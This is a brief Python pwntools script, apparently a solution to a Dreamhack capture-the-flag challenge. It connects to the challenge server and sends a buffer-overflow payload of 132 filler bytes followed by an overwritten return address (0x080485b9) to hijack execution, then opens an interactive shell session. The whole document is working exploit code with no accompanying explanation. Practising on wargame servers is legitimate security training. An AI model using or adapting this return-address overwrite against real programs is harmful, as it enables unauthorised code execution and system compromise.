from pwn import *

p = remote("host3.dreamhack.games", 10751)

text = "\x90"*132
text += p32(0x080485b9)

p.sendline(text)
p.interactive()